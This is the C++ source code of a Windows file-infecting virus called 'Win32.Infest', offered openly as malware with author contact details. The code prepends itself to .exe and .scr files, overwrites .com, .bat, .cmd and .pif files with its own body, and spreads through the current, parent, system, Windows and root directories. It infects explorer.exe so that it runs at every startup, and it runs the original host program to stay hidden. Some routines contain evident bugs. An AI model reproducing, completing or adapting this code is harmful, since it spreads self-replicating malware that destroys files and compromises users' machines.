// Win32.Infest - By SAD1c
// E-Mail: sad1c@interfree.it
// URL: sad1cpage.supereva.it
#include <windows.h>         // needed for "ShellExecute" and "GetSystemDirectory"
#include <fstream.h>         // my favourite I/O header file!
#include <dir.h>             // needed for "findfirst", "findnext", "chdir"
#define MAX_INFECTIONS 150   // number of infections for every virus run
#define MAX_DROPPINGS 150    // number of droppings for every virus run
#define MAX_FILE_SIZE 250000 // max file size that the virus will infect

int ic = MAX_INFECTIONS; // set max number of infections
int dc = MAX_DROPPINGS;  // set max number of droppings
int done;                // var. for the findfirst/findnext routine
char *code;              // the pointer that will contain the virus code
long vs;                 // this will contain the virus length in bytes
ffblk fl;                // structure for the findfirst/findnext routine

bool isinfected(char *file, long length) // compare the file code with the virus code.
{   // if the file is infected returns true, else returns false
    if (length >= vs) // if the file length is higher or equal the virus length...
    {
        bool infected = true;        // temporary boolean var.
        for (int m = 0; m < vs; m++) // for each char to scan
        {
            if (file[m] != code[m]) // compare the file char with the virus char
            {
                infected = false;   // if isn't equal to the virus char, than the file isn't infected!
                break;              // exit from the loop
            }
        }
        return infected; // returns the "infected" var.
    }
    else // the file length is less than the virus length. so it isn't infected
    {
        return false; // returns false
    }
}

void dropfile(char *destination)
{   // this function overwrite the "destination" file with the virus body
    ofstream outputf;                      // declare the output stream
    outputf.open(destination,ios::binary); // open "destination" in binary mode
    for (int p = 0; p < vs; p++)
        outputf.put(code[p]);              // write each byte of the virus
    outputf.close();                       // close the output stream
    dc--;                                  // decrease the droppings var. by one
}

void infectfile(char *host, long size)
{   // this function prepend to the "host" the virus body (only if it isn't infected)
    char *hc;  // the pointer that will contain the host code
    char a;    // used to read from the input file
    int c;     // counter, used for saving the host code
    hc = new char[size];    // initialize the host code container with the host size
	ifstream inputf;               // declare the input stream
    inputf.open(host,ios::binary); // open "host" in binary mode
    while(inputf.get(a))           // take each byte of the host
    {
        hc[c] = a;  // add the byte to the host code container
        c++;        // increase by one the counter
    }
    inputf.close(); // close the input stream
    if (isinfected(hc,size) == false) // compare the host code with the virus code
    { // if the host doesn't contain the virus, than it will be infected!
	    ofstream outputf;               // declare the output stream
        outputf.open(host,ios::binary); // open "host" in binary mode
        for (int p = 0; p < vs; p++)
            outputf.put(code[p]);       // write each byte of the virus
        for (int p = 0; p < size; p++)
            outputf.put(hc[p]);         // write each byte of the host
        outputf.close();                // close the output stream
        ic--;                           // decrease the infections var. by one
    }
    delete hc; // clear the memory from "hc"
}

void findfilestoinfect(char *files)
{   // this function search for "files". If there are any, than call the infectfile function
    done = findfirst(files,&fl,FA_SYSTEM+FA_HIDDEN); // search the first potential file to infect
    while(!done && ic > 0) // while there are files to infect and the infections var. isn't zero...
    {
        if (fl.ff_fsize <= MAX_FILE_SIZE)               // see if the file size is too big
            infectfile(fl.ff_name,fl.ff_fsize); // call the function to infect the file!
        done = findnext(&fl);                   // find another file to infect!
    }
}

void findfilestodrop(char *files)
{   // this function search for "files". If there are any, than call the dropfile function
    done = findfirst(files,&fl,FA_SYSTEM+FA_HIDDEN); // search the first potential file to drop
    while(!done && dc > 0) // while there are files to drop and the droppings var. isn't zero...
    {
        dropfile(fl.ff_name); // call the function to drop the file
        done = findnext(&fl); // find another file to drop
    }
}

void infectgroup()
{   // this function call the searching functions, to infect & drop the files.
    findfilestoinfect("*.exe"); // call the function to search for exe files to infect
    findfilestoinfect("*.scr"); // call the function to search for scr files to infect
    findfilestodrop("*.com");   // call the function to search for com files to drop
    findfilestodrop("*.bat");   // call the function to search for bat files to drop
    findfilestodrop("*.cmd");   // call the function to search for cmd files to drop
    findfilestodrop("*.pif");   // call the function to search for pif files to drop
}

char *getextension(char *file, int length)
{   // this function search and return the "file" extension
    char *ext = new char[3];      // this pointer will return the file extension
    char *f = new char[length]; // a new pointer: it has the length of the filename
    strcpy(f,file);               // copy the filename into the pointer "f"
    ext[0] = f[length-2];         // write the 1st char of the extension
    ext[1] = f[length-1];         // write the 2nd char of the extension
    ext[2] = f[length];           // write the 3rd char of the extension
    delete f;                     // clear the memory from "f"
    return ext;                   // return the extension
}

void main(int argc, char *argv[]) // this parameters are used for taking the command-line arguments
{
    char a;          // used to read from the virus code
    char tmp;        // temporary variable, used to memorize the previous byte
    char *hfc;       // the pointer that will contain the host code
    int p = 0;       // counter, used for getting the virus & host code & their length
    int hl = 0;      // this will contain the host length in bytes
    bool hw = false; // used to control when start the host code
    findfirst(argv[0],&fl,FA_HIDDEN+FA_SYSTEM); // gets info about the virus
    vs = fl.ff_fsize;    // assign to "vs" the virus length (temporary)
    code = new char[vs]; // initialize the virus code container with the virus size
    ifstream inputf;                  // declare the input stream
    inputf.open(argv[0],ios::binary); // open the virus in binary mode
    while(inputf.get(a))              // gets each byte
    {
        if (hw)         // if "hw" is true, than we are reading the host code
            hfc[p] = a; // so we add the byte to the host code container
        else            // if "hw" is false, than we are reading the virus code
        {
            if (a == 'Z' && tmp == 'M' && p > 1)
            {   // if this char is "Z" & the previous was "M", and this isn't the
                // second byte (you know: executables in windows begins with "MZ")
                hw = true;          // than we are reading the 2nd byte of the host code!
                hl = vs-(p-1);        // the length of the host is the total lenght minus the virus lenght!
                hfc = new char[hl]; // so we initialize the host code container with the host size
                hfc[0] = 'M';       // the first byte of the host is "M"!
                vs = p-1;           // assign to "vs" the real virus length
                p = 1;              // set "p" to one, cause we have written ne byte into the host code
                hfc[p] = 'Z';       // the second byte of the host is "Z"!
            }
            else
            {
                code[p] = a; // add the byte to the virus code container
                tmp = a;     // save the byte for the next loop
            }
        }
        p++;             // increase by one the counter
    }
    inputf.close();      // close the stream
    if (hl > 0)
    {   // if the host length is more than zero...
        ofstream outputf;                              // declare the output stream
        outputf.open(strcat(" ",argv[0]),ios::binary); // open a new file in binary mode
        for (int d = 0; d < hl; d++)
            outputf.put(hfc[d]);               // write each byte of the host
        outputf.close();                       // close the output file
        char *arg = new char[argc*200];        // declare & initialize the arguments string
        for (int e = 1; e <= argc; e++)           // for each argument
        {
            arg = strcat(arg,argv[e]);         // add the argument to the arguments string
            if (e < argc)
                arg = strcat(arg," "); // add a space " " between the arguments
        }
        ShellExecute(NULL,NULL,strcat(" ",argv[0]),arg,NULL,SW_SHOWNORMAL); // execute the host
        delete arg; // clear the memory from "arg"
    }
    delete hfc; // clear the memory from "hfc"
    for (int e = 1; e <= argc; e++)   // for each argument
    {
        char *ext = getextension(argv[e],strlen(argv[e])); // get the argument extension
        if (strcmp(ext,"exe") == 0 || strcmp(ext,"scr") == 0)  // if the extension is "exe" or "scr" then
        {
            findfirst(argv[e],&fl,FA_SYSTEM+FA_HIDDEN);    // gets info about the argument
            infectfile(fl.ff_name,fl.ff_fsize);            // call the function to infect the argument
        }
    }
    infectgroup(); // call the function to infect the current directory
    chdir("..\\"); // changes the current dir. with the parent dir.
    infectgroup(); // call the function to infect the parent directory
    char *wd = new char[50];   // declare & initialize a pointer that will contain the system dir.
    GetSystemDirectory(wd,50); // gets the system directory
    chdir(wd);     // changes the current dir. with the system dir.
    delete wd; // clear the memory from "wd"
    infectgroup(); // call the function to infect the system directory
    chdir("..\\"); // changes the current dir. with the windows dir.
    findfirst("explorer.exe",&fl,FA_SYSTEM+FA_HIDDEN); // gets info about the "explorer.exe"
    infectfile(fl.ff_name,fl.ff_fsize); // infect the "explorer.exe", to run on every startup
    infectgroup(); // call the function to infect the windows directory
    chdir("\\");   // changes the current dir. with the root dir. (like "C:\")
    infectgroup(); // call the function to infect the root directory
    delete code; // clear the memory from "code"
}